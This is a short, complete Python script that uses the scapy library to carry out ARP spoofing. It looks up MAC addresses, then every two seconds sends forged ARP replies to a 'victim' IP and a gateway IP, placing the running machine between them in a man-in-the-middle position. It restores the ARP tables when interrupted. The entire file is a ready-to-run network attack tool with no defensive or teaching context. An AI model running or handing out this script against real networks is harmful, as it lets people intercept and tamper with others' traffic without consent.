import scapy.all as scapy
import argparse
from time import sleep


def get_mac_by_ip(ip):
    while True:
     try:
      arp_request = scapy.ARP(pdst=ip)
      broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
      arp_request_broadcast = broadcast / arp_request
    
      ans = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
      return ans[0][1].hwsrc
     except IndexError:
      continue


def spoof(target_ip, spoof_ip):
    target_mac = get_mac_by_ip(target_ip)
    packet = scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    package = scapy.ARP(
        op=2,
        pdst=dest_ip,
        hwdst=get_mac_by_ip(dest_ip),
        psrc=source_ip,
        hwsrc=get_mac_by_ip(source_ip)
    )
    scapy.send(package, count=4, verbose=False)



def spoof_loop(target_ip, gateway_ip):
    try:
        sent_packages_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)

            sent_packages_count = sent_packages_count + 2
            print(f"\rPackages sent: {sent_packages_count}", end='')
            sleep(2)
    except KeyboardInterrupt:
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("\n\nAborted by keyboard. Restoring arp-tables..")


argparser = argparse.ArgumentParser()
argparser.add_argument('-ti', type=str, dest='ti', help='IP of victim') # target ip
argparser.add_argument('-gi', type=str, dest='gi', help='IP of gateway') # gateway ip
args = argparser.parse_args()

spoof_loop(target_ip=args.ti, gateway_ip=args.gi)



